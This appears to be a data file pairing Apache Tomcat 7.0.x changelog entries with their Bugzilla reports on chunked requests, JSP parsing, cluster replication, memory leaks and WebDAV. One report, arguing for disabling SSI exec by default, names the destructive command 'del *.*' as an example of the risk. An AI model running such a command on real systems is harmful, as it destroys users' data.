 * Download Tomcat 7.0.2 
 * Confingure an Apache httpd with a JkMount /examples/*
 * Use ab to generate request (ex:  ab -c 3 -n 1000000 ""http://localhost/examples/jsp/jsp2/el/basic-arithmetic.jsp"")

Thank you,
 Domenico Briganti"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49802
Coyote|Tomcat 7.0.3 (markt)|update||Various refactorings to reduce code duplication and unnecessary code in the connectors. (markt)|||
Coyote|Tomcat 7.0.3 (markt)|fix|49860|Add partial support for trailing headers in chunked HTTP requests. (markt)|getParameters() fails on chunked POST requests with trailers|"Created attachment 25967 [details]
Sample code to expose the issue

Overview: A servlet hosted on Tomcat fails to retrieve the request parameters when the request is using chunked transfer encoding and trailers.

Details: Sending a POST http request from a HTTP/1.1 client that uses chunked as transfer encoding and also includes trailers in the request (per RFC2616 sections 3.6.1 and 14.40):
Request: 
===========================
POST /echo/getBody HTTP/1.1
User-Agent: org.test.chunked.EchoClient (chunked-test)
content-type: application/x-www-form-urlencoded
connection: Close
host: localhost:8080
transfer-encoding: chunked

3
a=0
4
&b=1
0
x-Signature: Tuu2
============================

The server responds with an error message (see below) and a stack trace pointing to ChunkedInputFilter class (http://svn.apache.org/repos/asf/tomcat/tc6.0.x/trunk/java/org/apache/coyote/http11/filters/ChunkedInputFilter.java).
The method parseEndChunk() inside this class has a to do comment to handle trailers - this leads me to believe the trailers in chunked requests are not yet supported.

The sample code attached contains means to reproduce the issue:
 - an Eclipse project TestHttpServer that hosts an EchoServlet
 - an Eclipse project TestHttpClient that sends and receives chunked requests and verifies them in a unit test
 - Eclipse's Tomcat server configuration
The code is an extension of the attachments from bug 37794 (https://issues.apache.org/bugzilla/show_bug.cgi?id=37794) related to handling chunked requests in general.

Note that when removing the trailer in the request above, the server responds correctly and is able to extract the parameters sent in the request' body.

Here is the error response that the server sends back:
Response:
============================
Response: 
HTTP/1.1 500 Internal Server Error
Server: Apache-Coyote/1.1
Content-Type: text/html;charset=utf-8
Content-Length: 2266
Date: Wed, 01 Sep 2010 22:48:08 GMT
Connection: close

<html><head><title>Apache Tomcat/6.0.29 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 500 - </h1><HR size=""1"" noshade=""noshade""><p><b>type</b> Exception report</p><p><b>message</b> <u></u></p><p><b>description</b> <u>The server encountered an internal error () that prevented it from fulfilling this request.</u></p><p><b>exception</b> <pre>java.io.IOException: Invalid CRLF
	org.apache.coyote.http11.filters.ChunkedInputFilter.parseCRLF(ChunkedInputFilter.java:337)
	org.apache.coyote.http11.filters.ChunkedInputFilter.parseEndChunk(ChunkedInputFilter.java:356)
	org.apache.coyote.http11.filters.ChunkedInputFilter.doRead(ChunkedInputFilter.java:136)
	org.apache.coyote.http11.InternalInputBuffer.doRead(InternalInputBuffer.java:710)
	org.apache.coyote.Request.doRead(Request.java:428)
	org.apache.catalina.connector.InputBuffer.realReadBytes(InputBuffer.java:304)
	org.apache.catalina.connector.InputBuffer.realReadChars(InputBuffer.java:360)
	org.apache.tomcat.util.buf.CharChunk.substract(CharChunk.java:379)
	org.apache.catalina.connector.InputBuffer.read(InputBuffer.java:388)
	org.apache.catalina.connector.CoyoteReader.read(CoyoteReader.java:93)
	org.test.chunked.EchoServlet.getBody(EchoServlet.java:90)
	org.test.chunked.EchoServlet.doPostOrGet(EchoServlet.java:60)
	org.test.chunked.EchoServlet.doPost(EchoServlet.java:41)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:637)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
</pre></p><p><b>note</b> <u>The full stack trace of the root cause is available in the Apache Tomcat/6.0.29 logs.</u></p><HR size=""1"" noshade=""noshade""><h3>Apache Tomcat/6.0.29</h3></body></html>
===============================

Best regards,
Dan Luca."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49860
Jasper|Tomcat 7.0.3 (markt)|fix|49665|Provide better information including JSP file name and location when a missing file is detected during TLD handling. Patch provided by Ted Leung. (markt)|When file not found error occurs it does not tell you which file caused the error.|"Created attachment 25814 [details]
Patch to jasper so file not found error while parsing tld's report file and location.

When parsing jsp's into java, if a ""file not found"" occurrs like on a tag file it will not tell you which file caused the error.

As an example : 
------------------------
   [jasper] Jul 29, 2010 7:02:24 PM org.apache.jasper.JspC processFile
   [jasper] SEVERE: File ""/tags/struts-bean"" not found
   [jasper] Jul 29, 2010 7:02:25 PM org.apache.jasper.JspC processFile
   [jasper] SEVERE: file:/data/cvs/oscar_mcmaster/build/tmp/jspc/web/ticklerPlus/preparedTicklerList.jsp(22,18) Attribute value request.getAttribute(""preparedTicklers"") is quoted with "" which must be escaped when used within the value
------------------------

There are 2 errors showing here, one is from an invalid tag and the other is on an attribute. Note that the attribute works well and tells me which file and location is causing the problem. Note that with the first error it doesn't even tell me which file is causing the error.

Attached is a patch which shows the file and location of the error. After the patch file is applied I get a more useful out put

-------------------------
   [jasper] Jul 29, 2010 6:54:11 PM org.apache.jasper.JspC processFile
   [jasper] SEVERE: file:/data/cvs/oscar_mcmaster/build/tmp/jspc/web/ticklerPlus/Auth.jsp(1,49) File ""/tags/struts-bean"" not found
   [jasper] Jul 29, 2010 6:54:11 PM org.apache.jasper.JspC processFile
   [jasper] SEVERE: file:/data/cvs/oscar_mcmaster/build/tmp/jspc/web/ticklerPlus/preparedTicklerList.jsp(22,18) Attribute value request.getAttribute(""preparedTicklers"") is quoted with "" which must be escaped when used within the value
-------------------------"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49665
Jasper|Tomcat 7.0.3 (markt)|fix|49726|Specifying a default content type via a JSP property group should not prevent a page from setting some other content type. (markt)|JSP 2.2 new configuration element <default-content-type> under <jsp-property-group> works incorrectly on tomcat trunk|"Created attachment 25863 [details]
There are no java files in this project, so I only uploaded the war file. And its importance is the web.xml file.

I wrote a test case which have been attached to test some new configuration elements under <jsp-property-group> which are added in JSP2.2. But it runs incorrectly.

The error stack:

org.apache.jasper.JasperException: /defaultCtype/page1.jsp(17,1) Page directive: illegal to have multiple occurrences of contentType with different values (old: text/xml, new: text/html)

org.apache.jasper.compiler.DefaultErrorHandler.jspError(DefaultErrorHandler.java:40)
org.apache.jasper.compiler.ErrorDispatcher.dispatch(ErrorDispatcher.java:407)
org.apache.jasper.compiler.ErrorDispatcher.jspError(ErrorDispatcher.java:236)
org.apache.jasper.compiler.Validator$DirectiveVisitor.visit(Validator.java:133)
org.apache.jasper.compiler.Node$PageDirective.accept(Node.java:590)
org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2376)
org.apache.jasper.compiler.Node$Visitor.visitBody(Node.java:2428)
org.apache.jasper.compiler.Node$Visitor.visit(Node.java:2434)
org.apache.jasper.compiler.Node$Root.accept(Node.java:475)
org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2376)
org.apache.jasper.compiler.Validator.validateDirectives(Validator.java:1733)
org.apache.jasper.compiler.Compiler.generateJava(Compiler.java:195)
org.apache.jasper.compiler.Compiler.compile(Compiler.java:360)
org.apache.jasper.compiler.Compiler.compile(Compiler.java:340)
org.apache.jasper.compiler.Compiler.compile(Compiler.java:327)
org.apache.jasper.JspCompilationContext.compile(JspCompilationContext.java:594)
org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:315)
org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:320)
org.apache.jasper.servlet.JspServlet.service(JspServlet.java:265)
javax.servlet.http.HttpServlet.service(HttpServlet.java:668)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49726
Jasper|Tomcat 7.0.3 (markt)|fix|49799|The new omit attribute for jsp:attribute elements now supports the use of expressions and expression language. (markt)|The new JSP 2.2 omit-attribute in jsp:attribute does not work with EL or expressions|"Created attachment 25926 [details]
A JSP file which show three different use cases of the jsp:attribute omit attribute

I'm trying to make use of the new omit-attribute in the jsp:attribute. This new feature of JSP 2.2 is described in the Specs in JSP.5.10.

Table JSP.5-7 Attributes for the <jsp:attribute> standard action

omit (optional) Valid values are true and false. If true, and when
used with <jsp:element>, the attribute in the element being
ouput is omitted. Ignored when used with a standard or
custom action. Defaults to false.

There is an introduction text here: 
http://www.ibm.com/developerworks/forums/thread.jspa?messageID=14471459

and I'm trying to make this work in my setup but I'm failing. Or I don't get the point.

The following works:
<jsp:element name=""p"">
	<jsp:attribute name=""style"" omit=""true"" >color:red</jsp:attribute>

The following does NOT work:
<jsp:element name=""p"">
	<jsp:attribute name=""style"" omit=""<%=jspExpressionTrue%>"" >color:red</jsp:attribute>

The following does NOT work either:
<jsp:element name=""p"">
	<jsp:attribute name=""style"" omit=""${trueEL}"" >color:red</jsp:attribute>

Full JSP code in my attachment. I actually use the JSP-document (XML / JSPX-)syntax, but it does not work in any of the JSP dialects.


So I don't get the point why I should not be able to use EL in the omit-attribute, because then it's kind of useless.


I use
Windows Vista 64bit
JavaSE 1.6
Apache Tomcat 7.0.0 and Apche Tomcat 7.0.2beta
JSTL 1.1.2

All setup together in a typical ""Dynamic Web Project"" in Eclipse 3.6 Helios"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49799
Jasper|Tomcat 7.0.3 (markt)|fix|49916|Switch to using an initialisation parameter to pass JSP file information from Catalina to Jasper. This simplifies the Catalina code as well as making it easier for Geronimo and others to integrate Jasper. Patch provided by David Jencks. (markt)|use an init-param for jspFile on explicit jsp servlets|"Created attachment 26017 [details]
patch to translate jsp-file elements to jspServlet init params

A <servlet> element in web.xml can include a jsp-file rather than a servlet class. Currently in catalina and jasper this is handled by a bunch of runtime code that tracks the jsp file outside the servlet and feeds it to the servlet as a request attribute.  This requires a bunch of runtime code, some of which is marked ""hold your nose"".

Instead, it's possible to supply the jsp-file as an init-param to the jsp servlet instance that is set up to handle this <servlet> element.  This makes runtime handling of these jsp servlets identical to all other servlets and transfers the small amount of jsp-aware code still needed in catalina to the deployment phase.

The attached patch appears to pass all the tomcat tests and doesn't appear to cause any tck problems in the geronimo-tomcat integration.

In this patch, JspServlet will still respond to the jsp file as a request attribute but catalina won't send it.  Thus jasper is backwards compatible with earlier catalina versions but catalina is not backward compatible for explicitly mentioned jsp-file in servlet elements with earlier jasper versions.

It would be helpful to geronimo to apply the JspServlet patch even if the catalina changes aren't applied as we are using this technique in the geronimo-jetty integration and are subclassing JspServlet to provide this behavior."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49916
Jasper|Tomcat 7.0.3 (markt)|fix|49985|Fix thread safety issue in EL parser. (markt)|Lazy initialization without any synchronization - data race in AstInteger, AstFloatingPoint, AstString|"r998053
http://svn.apache.org/repos/asf/tomcat/tc6.0.x/trunk/java/org/apache/el/parser/AstInteger.java
http://svn.apache.org/repos/asf/tomcat/tc6.0.x/trunk/java/org/apache/el/parser/AstFloatingPoint.java
http://svn.apache.org/repos/asf/tomcat/tc6.0.x/trunk/java/org/apache/el/parser/AstString.java

Use lazy init without any synchronization in methods getInteger(), getFloatingPoint(), getString(), respectively.
 
Consider AstInteger:

private Number number;

    protected Number getInteger() {
        if (this.number == null) {
            try {
                this.number = new Long(this.image);
            } catch (ArithmeticException e1) {
                this.number = new BigInteger(this.image);
            }
        }
        return number;
    }


Data races on variable number :37
in method getInteger() :39
concurrent read on line 40
concurrent write on lines 42, 44"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49985
Cluster|Tomcat 7.0.3 (markt)|fix||Remove domainReplication attribute from ClusterManager. If you send session to only same domain, use DomainFilterInterceptor. (kfujino)|||
Cluster|Tomcat 7.0.3 (markt)|fix||Add Null check when CHANGE_SESSION_ID message received. (kfujino)|||
Cluster|Tomcat 7.0.3 (markt)|fix||Add support for LAST_ACCESS_AT_START system property to DeltaSession. (kfujino)|||
Cluster|Tomcat 7.0.3 (markt)|fix||Avoid a NPE in the DeltaManager when a parallel request invalidates the session before the current request has a chance to send the replication message. (markt)|||
Cluster|Tomcat 7.0.3 (markt)|fix|49905|Prevent memory leak when using asynchronous session replication. (markt)|In cluster, when using DeltaManager memory leak can occur|"Created attachment 26008 [details]
Patch to remove context classloader from threads in ThreadPoolExecutor in tribes

Tested on apache-tomcat-6.0.29 running under jdk 1.6.0_18.

When DeltaManager is instantiated and assigned in StandardContext.start(),
is it done AFTER StandardContext.bindThreads().

DeltaManager, in turn, during initalization, asks for sessions in other nodes,
and this may result in creating threads in ThreadPoolExecutor in tribes.

These threads created with contextClassLoader set to current
webapplication WebAppClassLoader.

This results in memory leak and error message during redeployment in tomcat log:

09/09/2010 14:46:19 S - - WebappClassLoader.clearReferencesThreads:
The web application [/creditdev] appears to have started a thread
named [pool-1-thread-1] but has failed to stop it. This is very likely
to create a memory leak.

Stacktrace:
       at java.util.concurrent.ThreadPoolExecutor.addThread(Unknown Source)
       at java.util.concurrent.ThreadPoolExecutor.addIfUnderCorePoolSize(Unknown
Source)
       at java.util.concurrent.ThreadPoolExecutor.execute(Unknown Source)
       at org.apache.catalina.tribes.group.interceptors.MessageDispatch15Interceptor.addToQueue(MessageDispatch15Interceptor.java:67)
       at org.apache.catalina.tribes.group.interceptors.MessageDispatchInterceptor.sendMessage(MessageDispatchInterceptor.java:68)
       at org.apache.catalina.tribes.group.ChannelInterceptorBase.sendMessage(ChannelInterceptorBase.java:75)
       at org.apache.catalina.tribes.group.interceptors.TcpFailureDetector.sendMessage(TcpFailureDetector.java:87)
       at org.apache.catalina.tribes.group.ChannelInterceptorBase.sendMessage(ChannelInterceptorBase.java:75)
       at org.apache.catalina.tribes.group.GroupChannel.send(GroupChannel.java:216)
       at org.apache.catalina.tribes.group.GroupChannel.send(GroupChannel.java:175)
       at org.apache.catalina.ha.tcp.SimpleTcpCluster.send(SimpleTcpCluster.java:813)
       at org.apache.catalina.ha.session.DeltaManager.getAllClusterSessions(DeltaManager.java:959)
       at org.apache.catalina.ha.session.DeltaManager.start(DeltaManager.java:930)
       at org.apache.catalina.core.ContainerBase.setManager(ContainerBase.java:438)
       at org.apache.catalina.core.StandardContext.start(StandardContext.java:4559)
       at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:791)
       at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:771)
       at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:546)
       at org.apache.catalina.startup.HostConfig.deployDescriptor(HostConfig.java:637)
       at org.apache.catalina.startup.HostConfig.deployDescriptors(HostConfig.java:563)
       at org.apache.catalina.startup.HostConfig.deployApps(HostConfig.java:498)
       at org.apache.catalina.startup.HostConfig.start(HostConfig.java:1277)
       at org.apache.catalina.startup.HostConfig.lifecycleEvent(HostConfig.java:321)
       at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119)
       at org.apache.catalina.core.ContainerBase.start(ContainerBase.java:1053)
       at org.apache.catalina.core.StandardHost.start(StandardHost.java:785)
       at org.apache.catalina.core.ContainerBase.start(ContainerBase.java:1045)
       at org.apache.catalina.core.StandardEngine.start(StandardEngine.java:445)
       at org.apache.catalina.core.StandardService.start(StandardService.java:519)
       at org.apache.catalina.core.StandardServer.start(StandardServer.java:710)
       at org.apache.catalina.startup.Catalina.start(Catalina.java:581)
       at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
       at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
       at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
       at java.lang.reflect.Method.invoke(Unknown Source)
       at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:289)
       at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:414)
       at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
       at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
       at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
       at java.lang.reflect.Method.invoke(Unknown Source)
       at org.tanukisoftware.wrapper.WrapperStartStopApp.run(WrapperStartStopApp.java:243)
       at java.lang.Thread.run(Unknown Source)

Proposed solution - implement java.util.concurrent.ThreadFactory in
MessageDispatch15Interceptor
and pass instance on ThreadPoolExecutor executor creation.
This instance must call setContextClassLoader(null) in newThread()
overriden method."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49905
Cluster|Tomcat 7.0.3 (markt)|fix|49924|When non-primary node changes into a primary node, make sure isPrimarySession is changed to true. (kfujino)|When non-primary node changes into a primary node, isPrimarySession is not changed to true.|"If BackupManager is used,
when a primary node is switched, 
DeltaSession#isPrimarySession is not changed to true. 

Non-primary node changes into a primary node 
when a primary node is stopped or we get a non-primary session. 

If a primary node is stopped, a primary node is switched. 
In AbstractReplicatedMap, when a primary node is switched, 
MapOwner(BackupManager)#objectMadePrimay is called. 
However, isPrimarySession does not change to true in this method. 
=====BackupManager#objectMadePrimay=====
public void objectMadePrimay(Object key, Object value) {
    if (value!=null && value instanceof DeltaSession) {
        DeltaSession session = (DeltaSession)value;
        synchronized (session) {
            session.access();
            session.endAccess();
        }
    }
}
=====

If we get a non-primary session,  a primary node is switched. 
However, isPrimarySession does not change to true. 
It is only a change of primary node.

I made a patch.
It contains the following. 
isPrimarySession is set to true in BackupManager#objectMadePrimay.
When get() is called in non-primary node, MapOwner#objectMadePrimay is called.


Best regards."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49924
Web applications|Tomcat 7.0.3 (markt)|fix||Correct the class name of the default JAR scanner in the documentation web application. (rjung)|||
Web applications|Tomcat 7.0.3 (markt)|fix|49585|Update JSVC documentation to reflect new packaging of Commons Daemon. (markt)|jsvc.tar.gz no longer in $CATALINA_HOME/bin|"The 5.5.30 and 6.0.28 (I haven't checked 7.0) binary releases of Tomcat no longer ship bin/jsvc.tar.gz. A look at the changelog leads me to believe this is intentional.

The documentation (setup.html), however, still refers to that file. In particular, the sentence ""Source tarballs for jsvc are included with the Tomcat binaries"" is no longer correct."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49585
Web applications|Tomcat 7.0.3 (markt)|update||Update the Servlet, JSP and EL Javadoc links to link to the specifications and the relevant part of the Java EE 6 Javadoc. (markt)|||
Web applications|Tomcat 7.0.3 (markt)|fix||Update a few places in the docs where the Manager documentation referred to the old role name of manager rather than than the new manager-script. (markt)|||
Extras|Tomcat 7.0.3 (markt)|fix|49861|Don't log RMI ports formatted with commas for the JMX remote listener. (markt)|"Log format of RMI ports can be improved, remove "","""|"I've enabled the fixed JMX port listen capability described in http://tomcat.apache.org/tomcat-6.0-doc/config/listeners.html
and found, that fixed ports are logged, but format is not proper imho:

Is:
INFO: The JMX Remote Listener has configured the registry on port 10,001 and the server on port 10,002 for the Platform server

Should:
INFO: The JMX Remote Listener has configured the registry on port 10001 and the server on port 10002 for the Platform server

Just note that is very uncommon logging TCP/UDP ports with a "","""|https://bz.apache.org/bugzilla/show_bug.cgi?id=49861
Other|Tomcat 7.0.3 (markt)|fix||Correct the user names created by the Windows installer for the Manager and Host Manager applications. (mturk)|||
Other|Tomcat 7.0.3 (markt)|fix||Correct the Eclipse compiler dependency in the Jasper POM. (markt)|||
Other|Tomcat 7.0.3 (markt)|add||Extend Checkstyle validation checks to check import order. (markt)|||
Other|Tomcat 7.0.3 (markt)|fix|49758|Fix generics warnings exposed by a fix in Eclipse 3.6. Patch provided by sebb. (markt)|[Patch] Generics warnings - rawtypes|"Created attachment 25894 [details]
Fix up some raw type warnings"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49758
Other|Tomcat 7.0.3 (markt)|update||Update Apache Commons Pool to 1.5.5. (markt)|||
Other|Tomcat 7.0.3 (markt)|update|49955|Improvement and correction of Building Tomcat guide. Based on a patch from Wesley Acheson. (timw)|Building instructions incorrect.|"Created attachment 26047 [details]
Fixes above problems and adds a section on shutdown.

The building instructions are currently incorrect

 * The SVN repository URL for trunk is incorrect.
 * The implication in the text is that eclipse 4 is required. It isn't.
 * The step about the main class is incorrect.
 * The start launch argument is inferred"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49955
Other|Tomcat 7.0.3 (markt)|update|49993|Improve check for JAVA_HOME and add support for JRE_HOME in service.bat. (mturk)|service.bat does not check for JAVA_HOME validity|"service.bat does not check for JAVA_HOME validity.
It also does not check for JRE_HOME like catalina.bat does trough
setclasspath.bat script.

If neither the JAVA_HOME nor JRE_HOME are set we should inform the
user and then switch to auto detection mode from the registry"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49993
Catalina|Tomcat 7.0.2 (markt)|fix||Fix regression that prevented running with a security manager enabled. (markt)|||
Web applications|Tomcat 7.0.2 (markt)|fix||Correct Javadoc errors. (markt)|||
Web applications|Tomcat 7.0.2 (markt)|add||Provide Javadoc for Servlet 3.0 API, JSP 2.2 API and EL 2.2 API. (markt)|||
Web applications|Tomcat 7.0.2 (markt)|fix||Remove second copy of RUNNING.txt from the full-docs distribution. Some unpacking utilities can't handle multiple copies of a file with the same name in a directory. (markt)|||
Other|Tomcat 7.0.2 (markt)|add||Extend Checkstyle validation checks to check for tabs in nearly all text files. (markt)|||
Other|Tomcat 7.0.2 (markt)|update||Update Apache Commons Daemon from 1.0.2 to 1.0.3. (markt)|||
Other|Tomcat 7.0.2 (markt)|update||Update Eclipse JDT Core Batch Compiler (ecj.jar) from 3.5.1 to 3.6. (markt)|||
Catalina|Tomcat 7.0.1 (markt)|fix||GSOC 2010. Continue work to align MBean descriptors with reality. Patch provided by Chamith Buddhika. (markt)|||
Catalina|Tomcat 7.0.1 (markt)|fix||When running under a security manager, enforce package access and package definition restrictions defined in the catalina.properties file. (markt)|||
Catalina|Tomcat 7.0.1 (markt)|fix||"When using a Loader configured with searchExternalFirst=""true"" failure to find the class in an external repository should not prevent searching of the local repositories. (markt)"|||
Catalina|Tomcat 7.0.1 (markt)|add||Add entryPoint support to the CSRF prevention filter. (markt)|||
Catalina|Tomcat 7.0.1 (markt)|fix|48297|Correctly initialise handler chain for web services resources. (markt)|webservices.ServiceRefFactory.initHandlerChain adds wrong items to list?|"naming.factory.webservices.ServiceRefFactory.initHandlerChain method does the following:

HandlerInfo handlerref (parameter)
HandlerChain handlerList = (HandlerChain) handlerRegistry.getHandlerChain(portName);
handlerList.add(handlerref);

Now according to http://www.j2ee.me/j2ee/1.4/docs/api/javax/xml/rpc/handler/HandlerChain.html HandlerChain, ""All elements in the HandlerChain are of the type javax.xml.rpc.handler.Handler.""

However HandlerInfo (javax.xml.rpc.handler.HandlerInfo) is not of the type Handler. HandlerInfo should be passed to the init() method of a Handler instance."|https://bz.apache.org/bugzilla/show_bug.cgi?id=48297
Catalina|Tomcat 7.0.1 (markt)|add|48960|Add a new option to the SSI Servlet and SSI Filter to allow the disabling of the exec command. This is now disabled by default. Based on a patch by Yair Lenga. (markt)|SSI Servlet should support safe configuration|"The current configuration of the SSI module is ""All"" or ""None"". The ""ALL"" option will expose all the legacy Apache SSI directive (echo, printenv, if, exec, ...). As documented, allowing SSI will allow execution of arbitrary programs using the ""exec"". As a result, there is no safe way to expose sites/projects containing SSI directive, without taking a security risk, or reviewing of every file.

The ""exec"" directive, with the cmd option is a major risk. Even for Apache, you have the option to allowing the ""safe"" include (includeNoExec). The includeNoExec allow pages to be served, even when the content is not reviewed, or when users are allowed to upload content to the site.

I have a big site which need to be converted into JSP. I would like to use the SSI servlet to allow for transition over time. The extra risk from ( from exec cmd) make it impossible to deploy the SSI.

My request: Modify the configuration of SSI as follow: By default, it will only allow ""safe"" directive (no exec cmd=...). This will eliminate the risk from arbitrary execution of commands (""del *.*""). It will also remove many potentail load problems. The cmd= should only be allowed using a directive like ""allowUnsafeExec"", which will default to false.

I think that the change will make it easier to use the SSI feature, without exposing the server to big risk. The risk associated with the ""safer"" version of SSI is similar to the risk from running JSP pages."|https://bz.apache.org/bugzilla/show_bug.cgi?id=48960
Catalina|Tomcat 7.0.1 (markt)|add||48998, 49617: Add the ExpiresFilter, a port of the httpd mod_expires module. Patch provided by Cyrille Le Clerc. (markt)|Proposal : port mod_expires in java as ExpiresFilter Servlet Filter|"Created attachment 25189 [details]
Port of mod_expires as ExpiresFilter

Here is a proposal to port Apache Httpd mod_expires in java as ExpiresFilter, a standard Servlet Filter.

I detailed a standalone version on http://code.google.com/p/xebia-france/wiki/ExpiresFilter . More over, I tried my best to provide very detailed javadocs and docs (in filter.html).

The proposed contribution is slightly different because it uses Tomcat logging, few Servlet 3 enhancements and test cases use Tomcat engine.

The attached patch contains :
* ExpiresFilter.java : the Expires Filter
* TestExpiresFilter : detailed test cases
* filter.xml : doc updates

The filter has been optimized using a profiler and stress tested with Apache Bench under high load."|https://bz.apache.org/bugzilla/show_bug.cgi?id=48998
Catalina|Tomcat 7.0.1 (markt)|fix|49030|When initializing/starting/stopping connectors and one of them fails, do not ignore the others. (markt/kkolinko)|Processing of Tomcat Connector configuration can leave some connectors uninitialized|If the Server part of the Tomcat 6 configuration is beeing processed and there are more connectory defined, it seems to be the fact the exceptions during the connector initialization are not catched properly, so if there comes some exception by the initialization of one connector (for example to try to initialize the new connector for the same port like had the already initialized connector), then no other connectors are processed and created (no one listening port is allocated) even if such other connectors are defined properly. It leads to the situation the connectory are then initialized differently if the order of the connectors changes. It can be very confusing if searching some error in the definitions. Together with the fact, the default server.xml contains at least in some cases the invalid connector definition it leads to serious confusion it searching the configuration problem...|https://bz.apache.org/bugzilla/show_bug.cgi?id=49030
Catalina|Tomcat 7.0.1 (markt)|fix|49128|Don't swallow exceptions unnecessarily in WebappClassLoader.start(). (markt)|loader.WebappClassLoader.start() ignores Exception|"catalina.loader.WebappClassLoader.start() ignores Exception.

However, it probably only needs to ignore SecurityException"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49128
Catalina|Tomcat 7.0.1 (markt)|fix|49182|"Align comments in setclasspath.[sh|bat] with behaviour. Based on a patch provided by sebb. (markt)"|Documentation patch for setclasspath.sh|"Created attachment 25347 [details]
Documentation patch for setclasspath.sh

The comments state that the script sets CLASSPATH, however that is not the case.

Patch to document what the file actually does."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49182
Catalina|Tomcat 7.0.1 (markt)|fix|49230|Enhance JRE leak prevention listener with protection for the keep-alive thread started by sun.net.www.http.HttpClient. Based on a patch provided by Rob Kooper. (markt)|sun.net.www.http.KeepAliveCache preventing classloader from being garbage collected|"Created attachment 25377 [details]
patch to jreMemoryLeakPreventionListener to load sun.net.www.http.KeepAliveCache using system classloader

When a servlet creates a URLConnection, internally this is done using sun.net.www.http.HttpClient. To have the ability to keep connections alive and close them after a certain time they are placed inside a cache. A static reference is kept to this cache (sun.net.www.http.KeepAliveCache).

It seems this cache is never released and the classloader stays in memory.

I have a patch to jreMemoryLeakPreventionListener.java that will make sure the KeepAliveCache is loaded by the system classloader and not the webAppClassLoader."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49230
Catalina|Tomcat 7.0.1 (markt)|fix|49414|When reporting threads that may have triggered a memory leak on web application stop, attempt to differentiate between request processing threads and threads started by the application. (markt)|Wrong memory leak detection: executor thread reported as web app thread|"Created attachment 25566 [details]
Unit test allowing to generate the wrong log message (but doesn't catpure the log to really test it)

At Tomcat shutdown I have quite often following message

SEVERE: The web application [/] appears to have started a thread named [http-8001-exec-1] but has failed to stop it. This is very likely to create a memory leak. 

Looking into the details it appears that a request is still being processed. The thread that is detected as leak is not a user thread but Tomcat's executor thread.

I'm not sure what would be the right behaviour here: complain about a request that is still being processed or to wait for it. In any case, Tomcat shouldn't complain with current message as it is too misleading and leads to ignoring real memory leak messages.

The root cause of the problem is the strategy used to detect threads started by a web app which isn't able to correctly identify threads started by Tomcat itself (contextClassLoader is changed at each request). A solution could be to use a ThreadGroup to identify ""Tomcat threads"". If you see this as a good solution, I can try to prepare a patch.

Same problem occurs in Tomcat 6."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49414
Catalina|Tomcat 7.0.1 (markt)|fix|49428|Add a work-around for the known namespace issues for some Microsoft WebDAV clients. Patch provided by Panagiotis Astithas. (markt)|Fix WebDAV mounts from Windows Mini-Redirector clients|"Created attachment 25584 [details]
The patch for WebdavServlet

The WebdavServlet does not work with native Windows clients besides the deprecated Web Folders. The more modern, common and supported by Microsoft client, Windows Mini-Redirector that allows mapping of WebDAV shares to local drives cannot mount a WebDAV share served by tomcat's WebdavServlet.

You can observe this by using the following command from a windows machine:

> net use * http://hostname:8080/webdav

It should fail without the attached patch. The reason is that:

DAV: namespaced elements in a PROPFIND responses can not use a default namespace; each element must be explicitly prefixed with a namespace prefix defined in itself or a parent. If a default namespace is used the client will give no errors, but will not display any resources.

This is mentioned here, albeit for a single Windows version, Windows Server 2003:

http://www.greenbytes.de/tech/webdav/webdav-redirector-list.html

I have verified that the patch fixes WebDAV mounts for Windows XP, Vista & 7."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49428
Catalina|Tomcat 7.0.1 (markt)|add||Add support for *.jar pattern in VirtualWebappLoader. (kkolinko)|||
Catalina|Tomcat 7.0.1 (markt)|add||Use a LockOutRealm in the default configuration to prevent attempts to guess user passwords by brute-force. (markt)|||
Catalina|Tomcat 7.0.1 (markt)|add|49478|Add support for user specified character sets to the AddDefaultCharsetFilter. Based on a patch by Felix Schumacher. (markt)|Add encoding parameter to AddDefaultCharSetFilter|"AddDefaultCharSetFilter adds a default charset to each request. It assumes ISO-8859-1 as the default charset.

